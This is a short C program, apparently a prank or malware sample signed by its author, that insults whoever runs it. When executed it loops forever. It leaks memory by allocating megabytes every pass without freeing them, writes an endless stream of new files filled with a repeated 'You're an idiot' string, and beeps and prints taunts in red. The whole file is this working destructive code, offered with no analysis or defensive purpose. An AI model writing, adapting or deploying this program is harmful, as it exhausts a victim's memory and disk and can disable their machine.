#include <stdio.h>
#include <stdlib.h>

int main() {
    // BY SKAYLATK
    printf("\033[31m");
    int i = 1;
    char fname[40];
    char g[] = "😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅You're an idiot😅😅You're an idiot😅You're an idiot😅";
    while(1) {
        i++;
        int *m1 = malloc(1000000);
        int *m2 = malloc(1000000);
        int *m3 = malloc(1000000);
        int *m4 = malloc(1000000);
        printf("\aYOU ARE AN IDIOT \t");
        sprintf(fname, "LABESK%d.text", i);
        FILE *f;
        f = fopen(fname, "wb");
        if (f != NULL) {
            fwrite(g, sizeof(char), sizeof(g), f);
            fclose(f);
        }
    }
    return 0;
}
